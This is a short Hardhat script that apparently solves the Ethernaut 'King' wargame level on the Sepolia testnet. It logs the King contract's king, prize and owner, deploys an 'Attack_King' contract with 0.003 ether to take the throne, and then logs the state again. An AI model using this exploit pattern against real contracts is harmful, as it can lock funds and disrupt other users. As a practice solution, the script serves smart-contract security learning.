const {ethers} = require('hardhat');

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const SECOND_PRIVATE_KEY = process.env.SECOND_PRIVATE_KEY;
const ALCHEMY_SEPOLIA_URL = process.env.ALCHEMY_SEPOLIA_URL;

const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_SEPOLIA_URL);
const wallet1 = new ethers.Wallet(PRIVATE_KEY, provider);
const wallet2 = new ethers.Wallet(SECOND_PRIVATE_KEY, provider);

const kingAddress = '0x792885CA057ef3887c04866341ff12Ca5F088f62';
const kingJson = require('../artifacts/contracts/King.sol/King.json');
const kingAbi = kingJson.abi;

const kingContract = new ethers.Contract(kingAddress, kingAbi, wallet1);

const main =  async () => {

    let king =  await  kingContract._king();
    let prize = await kingContract.prize();
    let owner = await kingContract.owner();

    console.log(`the king is :${king}`);
    console.log(`the prize is :${ethers.utils.formatEther(prize)}`);
    console.log(`the owner is :${owner}`);

    const Attack_King = await ethers.getContractFactory("Attack_King");
    const targetAddress = kingAddress;
    const attack_king = await Attack_King.connect(wallet2).deploy(targetAddress, { value: ethers.utils.parseEther("0.003") });
    await attack_king.deployed()
    //打印地址
    console.log("Attack_King deployed to:", attack_king.address);

     king =  await  kingContract._king();
     prize = await kingContract.prize();
     owner = await kingContract.owner();

    console.log(`the king is :${king}`);
    console.log(`the prize is :${ethers.utils.formatEther(prize)}`);
    console.log(`the owner is :${owner}`);


}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });
